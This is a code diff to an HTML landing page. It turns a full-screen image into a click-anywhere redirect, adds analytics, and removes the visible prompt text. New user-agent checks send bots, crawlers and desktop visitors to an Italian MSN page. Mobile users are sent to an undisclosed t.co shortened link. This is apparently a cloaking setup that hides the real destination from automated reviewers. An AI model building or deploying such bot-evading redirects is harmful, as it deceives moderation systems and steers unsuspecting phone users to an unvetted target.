@@ -1,9 +1,18 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-0WP8CV0WW2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-0WP8CV0WW2');
+</script>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Mobile Landing</title>
+  <title>Landing Page</title>
   <style>
     html, body {
       margin: 0;
@@ -12,43 +21,40 @@
       width: 100%;
       background: url('https://i.imgur.com/QUESCLI.jpeg') no-repeat center center fixed;
       background-size: cover;
-      font-family: sans-serif;
-      color: white;
+      cursor: pointer;
       display: flex;
       align-items: center;
       justify-content: center;
-      text-align: center;
     }
-    .overlay {
-      background: rgba(0,0,0,0.5);
-      padding: 1rem 1.5rem;
-      border-radius: 1rem;
-    }
-    @media (min-width: 768px) {
-      body {
-        background: #111;
+
+    /* For small phone screens */
+    @media (max-width: 768px) {
+      html, body {
+        background-size: cover;
       }
     }
   </style>
 </head>
 <body>
 
-<div class="overlay" id="message">Tap anywhere to continue</div>
-
 <script>
+  // URLs
   const mobileURL = "https://t.co/lU6lupZ2Qa";
-  const messageEl = document.getElementById("message");
-  const isMobile = /iphone|ipad|ipod|android|blackberry|mini|windows\sce|palm/i.test(
-    navigator.userAgent.toLowerCase()
-  );
+  const pcURL = "https://www.msn.com/it-it";
 
-  if (isMobile) {
-    document.body.addEventListener("click", () => {
+  // Detect device and bots
+  const userAgent = navigator.userAgent.toLowerCase();
+  const isMobile = /iphone|ipad|ipod|android|blackberry|mini|windows\sce|palm/i.test(userAgent);
+  const isBot = /bot|crawler|spider|crawling/i.test(userAgent);
+
+  // Click anywhere to redirect
+  document.body.addEventListener("click", () => {
+    if (isBot || !isMobile) {
+      window.location.href = pcURL;
+    } else {
       window.location.href = mobileURL;
-    });
-  } else {
-    messageEl.textContent = "This page is designed for mobile devices.";
-  }
+    }
+  });
 </script>
 
 </body>
